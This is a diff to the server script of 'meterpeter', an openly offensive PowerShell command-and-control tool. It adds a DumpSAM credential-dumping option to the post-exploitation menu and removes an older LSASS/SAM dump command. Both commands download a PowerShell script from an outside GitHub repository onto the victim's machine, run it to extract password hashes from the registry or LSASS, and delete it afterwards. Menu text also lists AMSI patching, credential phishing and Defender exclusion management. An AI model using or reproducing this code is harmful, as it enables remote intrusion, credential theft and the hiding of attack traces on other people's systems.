@@ -2364,7 +2364,6 @@ While($Client.Connected)
       write-host "   PhishCred   Promp remote user for logon creds";
       write-host "   AMSIpatch   Disable AMS1 within current process";
       write-host "   Allprivs    Enable all current shell privileges";
-      write-host "   DumpSAM     DumpLSASS/SAM/SYSTEM/SECURITY metadata";
       write-host "   Exclusions  Manage Windows Defender exclusions";
       write-host "   LockPC      Lock remote host WorkStation";
       write-host "   Restart     Restart remote host WorkStation";
@@ -3117,10 +3116,10 @@ While($Client.Connected)
       If($choise -ieq "Escalate")
       {
         write-host "`n`n   Requirements:" -ForegroundColor Yellow
-        write-host "   Attacker needs to input the delay time (in seconds) for the client.ps1"
-        write-host "   to beacon home after the privilege escalation. Attacker also needs to exit"
-        write-host "   meterpeter C2 and start a new listenner to receive the elevated connection."
-        write-host "   Remark: This function does not execute _EOP_ if client connection is active." -ForegroundColor Yellow
+        write-host "   EOP modules requires that attacker input the delay time (in seconds)"
+        write-host "   for client.ps1 to beacon home after the privilege escalation. Attacker"
+        write-host "   also needs to exit meterpeter connection and start a new listenner with"
+        write-host "   the same settings [LHOST+LPORT] to receive the elevated connection back."
         write-host "`n`n   Modules     Description                   Privileges Required" -ForegroundColor green
         write-host "   -------     -----------                   ------------------"
         write-host "   getadmin    Escalate client privileges    UserLand"
@@ -3660,9 +3659,16 @@ While($Client.Connected)
         write-host "Administrator" -ForegroundColor Red
         write-host "   Browser   Clear-text credential dump     " -NoNewline
         write-host "Administrator" -ForegroundColor Red
+        write-host "   DumpSAM   Dump hashs from registry hives " -NoNewline
+        write-host "Administrator" -ForegroundColor Red
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Pass> " -NoNewline -ForeGroundColor Green;
         $pass_choise = Read-Host;
+        If($pass_choise -ieq "DumpSAM" -or $pass_choise -ieq "sam")
+        {
+           write-host " * Dump credentials from registry hives." -ForegroundColor Green;write-host "";
+           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cd `$Env:TMP;iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Sam/Invoke-Dump.ps1`" -OutFile `"`$Env:TMP\Invoke-Dump.ps1`"|Unblock-File;Import-Module -Name `".\Invoke-Dump.ps1`" -Force;Invoke-Dump;Remove-Item -Path `"`$Env:TMP\Invoke-Dump.ps1`" -Force}Else{echo `"   `> Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
+        }
         If($pass_choise -ieq "WDigest")
         {
            write-host " * WDigest Credential caching [memory]`n" -ForegroundColor Green
@@ -3806,11 +3812,6 @@ While($Client.Connected)
           $Command = $Null;
         }
         $cred_choise = $Null;
-      }
-      If($choise -ieq "DumpSAM" -or $choise -ieq "sam")
-      {
-        write-host " * DumpLSASS/SAM/SYSTEM/SECURITY metadata." -ForegroundColor Green;write-host "";
-        $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DumpLsass.ps1`" -OutFile `"`$Env:TMP\DumpLsass.ps1`"|Unblock-File;powershell -File `$Env:TMP\DumpLsass.ps1;Start-Sleep -Seconds 1;Remove-Item -Path `"`$Env:TMP\DumpLsass.ps1`" -Force"
       }
       If($choise -ieq "BruteAcc")
       {
